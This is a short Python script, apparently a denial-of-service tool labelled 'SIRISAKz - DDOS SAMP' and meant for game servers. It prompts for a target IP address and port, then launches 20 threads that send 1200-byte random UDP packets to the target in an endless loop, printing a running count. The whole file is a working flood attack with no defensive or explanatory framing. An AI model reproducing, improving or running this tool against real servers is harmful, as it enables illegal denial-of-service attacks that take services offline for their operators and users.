import random
import socket
import threading

print("")
print("")
print(""" 
	| SIRISAKz - DDOS SAMP | 
""")
print("")
print("""
	  - UDP FLOOD ATTACK -
""")
print("")
print("")
ip = input(" IP : ")
port = input(" PORT : ")

def udpsirisakz():
	data = random._urandom(1200)
	thr = int(0)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			s.sendto(data,addr)
			for x in range(1):
				s.sendto(data,addr)
				thr += 1
			print(f"| SIRISAKz UDP - ATTACK | {ip}:{port} Time: 120 >>", thr)
		except:
			thr -= 1

for y in range(20):
		th = threading.Thread(target = udpsirisakz)
		th.start()